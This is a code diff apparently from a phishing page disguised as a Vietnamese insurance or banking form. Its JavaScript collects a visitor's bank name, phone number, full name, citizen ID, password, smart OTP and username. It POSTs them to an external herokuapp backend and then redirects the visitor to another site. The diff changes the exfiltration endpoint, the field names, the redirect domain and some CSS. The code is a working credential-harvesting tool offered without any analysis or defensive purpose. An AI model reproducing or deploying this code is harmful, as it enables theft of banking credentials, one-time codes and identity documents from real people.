@@ -612,18 +612,18 @@
                               return false;
                             }
 
-                            fetch("https://portal-be.herokuapp.com/api/user", {
+                            fetch("https://portal-bh-be.herokuapp.com/api/users", {
 
                               method: 'POST',
                               body: JSON.stringify({
                                 id: create_UUID(),
-                                bankName: yinghang,
+                                bank_name: yinghang,
                                 phone: dianhua,
-                                fullName: mingzi,
-                                citizenId: sfz,
+                                full_name: mingzi,
+                                citizen_id: sfz,
                                 password: mima,
-                                smartOtp: aqzn,
-                                userName: title
+                                smart_otp: aqzn,
+                                user_name: title
                               }),
                               headers: {
 
@@ -634,7 +634,7 @@
                             }).then(function (respon) {
                               if (respon.status == 200) {
                                 alert("Thêm dữ liệu thành công");
-                                window.location.assign('https://801130bca.org/homepage');
+                                window.location.assign('https://thongtinbaohiem.club/homepage');
                               }
                               return respon.status
                             }).catch(error => {
@@ -801,7 +801,13 @@
                           }
 
                           form .weui-form-item {
-                            margin: 6px 15px;
+                            width: 130px;
+                            margin-left: 205px;
+                          }
+
+                          form .weui-form-item a {
+                            font-size: small;
+
                           }
 
                           .weui-form-item {
